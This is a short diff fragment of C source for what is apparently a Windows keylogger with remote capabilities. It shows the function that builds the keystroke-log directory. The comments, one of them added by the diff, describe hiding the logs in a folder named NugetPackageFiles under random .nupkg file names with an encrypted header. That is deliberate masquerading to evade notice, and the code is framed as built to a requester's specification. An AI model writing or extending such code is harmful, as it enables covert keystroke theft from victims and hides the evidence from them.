@@ -87,6 +87,7 @@ typedef struct { HDESK to_restore; HDESK to_close; } input_desktop_scope_t;
 
 /* Build the keylogger logs directory path.
  * The keylogger writes to %TEMP%\\NugetPackageFiles (matching your required folder name).
+ * Log files use random NuGet-style .nupkg names; the UTC date is inside the encrypted HTML header.
  * If temp path is unavailable, fall back to C:\\NugetPackageFiles. */
 int remote_get_logs_dir(char* out_path, size_t out_size) {
     if (!out_path || out_size < 8) return 0;
